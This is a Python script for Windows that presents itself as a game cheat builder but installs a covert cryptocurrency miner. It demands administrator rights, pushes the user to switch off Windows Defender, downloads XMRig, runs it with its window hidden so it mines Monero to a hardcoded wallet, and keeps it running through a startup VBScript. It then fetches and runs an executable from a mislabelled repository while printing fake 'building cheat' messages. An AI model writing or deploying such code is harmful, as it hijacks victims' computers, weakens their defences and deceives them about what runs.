import os
import zipfile
import subprocess
import sys
import ctypes
import urllib.request
import shutil
import threading
import time
import json
import webbrowser  # Importing webbrowser module to open the URL

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def show_message_box(message, title):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

def download_file(url, destination):
    try:
        with urllib.request.urlopen(url) as response, open(destination, "wb") as file:
            file.write(response.read())
    except Exception as e:
        print(f"Error downloading file: {e}")
        return False
    return True

def extract_zip(zip_file, extract_dir):
    try:
        with zipfile.ZipFile(zip_file, "r") as zip_ref:
            zip_ref.extractall(extract_dir)
    except zipfile.BadZipFile:
        print("Error extracting the zip file.")
        return False
    return True

def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
    try:
        with open(startup_path, "w") as vbs_file:
            vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\n'
                           f'WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {bitcoin_address} --tls --coin monero", 0, False\n')
    except IOError as e:
        print(f"Error creating startup VBScript: {e}")
        return False
    return True

def run_xmrig(xmrig_path, bitcoin_address):
    try:
        subprocess.Popen([xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", bitcoin_address, "--tls", "--coin", "monero"],
                         creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Error running xmrig: {e}")
        return False
    return True

def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            ip_data = json.load(response)
        return ip_data.get("ip")
    except Exception:
        print("Error retrieving public IP address.")
        return None

def move_extracted_files(src_dir, dest_dir):
    for item in os.listdir(src_dir):
        shutil.move(os.path.join(src_dir, item), os.path.join(dest_dir, item))

def download_and_run(url, destination, hide_console=False):
    try:
        if download_file(url, destination):
            print("Building cheat...")
            time.sleep(5)
            print(f"Cheat built to: {destination}")
            time.sleep(1)
            subprocess.Popen([destination] if hide_console else f"START {destination}", shell=True)
            print(f"Running {'(hidden)' if hide_console else ''}: {destination}")
    except Exception as e:
        print(f"Error: {e}")

# Check if Windows Defender is enabled using PowerShell command without showing the PowerShell window
def is_windows_defender_on():
    try:
        # PowerShell command to check Windows Defender status
        command = 'Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring'
        # Use subprocess with 'creationflags=subprocess.CREATE_NO_WINDOW' to hide the console window
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        # If result contains 'True', Defender is turned off, if 'False', it's on
        if result.stdout.strip() == 'False':
            return True
        else:
            return False
    except Exception as e:
        print(f"Error checking Windows Defender status: {e}")
        return False

# Open a webpage with instructions to disable Windows Defender
def open_instructions_url():
    instructions_url = "https://www.windowscentral.com/how-disable-windows-defender-antivirus-windows-10"
    webbrowser.open(instructions_url)

def main():
    if not is_admin():
        show_message_box("This software must be run as Administrator!", "Admin Privileges Required")
        sys.exit(1)

    # Check if Windows Defender is on
    if is_windows_defender_on():
        # Show message with instructions to disable Windows Defender
        show_message_box("Windows Defender Antivirus is currently enabled. Please disable it before running this script.\n\nClick OK to view instructions on how to disable it in your browser.", "Windows Defender Active")
        
        # After OK, open the instructions page
        open_instructions_url()
        sys.exit(1)

    URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
    FILENAME = "C:\\Program Files (x86)\\Shell\\xmrig-6.22.2-gcc-win64.zip"
    EXTRACT_BASE_DIR = "C:\\Program Files (x86)\\Shell"
    BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
    STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "xmrig_startup.vbs")
    public_ip = get_public_ip()

    if not public_ip:
        print("Unable to retrieve public IP, aborting.")
        sys.exit(1)

    EXTRACT_DIR = os.path.join(EXTRACT_BASE_DIR, public_ip)
    os.makedirs(EXTRACT_DIR, exist_ok=True)

    if download_file(URL, FILENAME):
        temp_extract_dir = os.path.join(EXTRACT_BASE_DIR, "temp_xmrig")
        if not extract_zip(FILENAME, temp_extract_dir):
            sys.exit(1)

        extracted_folders = [f for f in os.listdir(temp_extract_dir) if os.path.isdir(os.path.join(temp_extract_dir, f)) and "xmrig" in f.lower()]
        if extracted_folders:
            extracted_dir = os.path.join(temp_extract_dir, extracted_folders[0])
            move_extracted_files(extracted_dir, EXTRACT_DIR)
            shutil.rmtree(temp_extract_dir)

            xmrig_path = os.path.join(EXTRACT_DIR, "xmrig.exe")
            if os.path.exists(STARTUP_PATH):
                os.remove(STARTUP_PATH)

            if not create_startup_vbs(xmrig_path, STARTUP_PATH, BITCOIN_ADDRESS):
                sys.exit(1)

            if not run_xmrig(xmrig_path, BITCOIN_ADDRESS):
                sys.exit(1)

            os.remove(FILENAME)

    download_and_run("https://github.com/Cr0mb/Data-Visualization-with-Python/blob/main/CS2%20External%20Multi%20DX11.exe?raw=true", 
                     os.path.join(os.path.expanduser("~"), "Desktop", "GHax.exe"), hide_console=False)

    sys.exit(0)

if __name__ == "__main__":
    main()
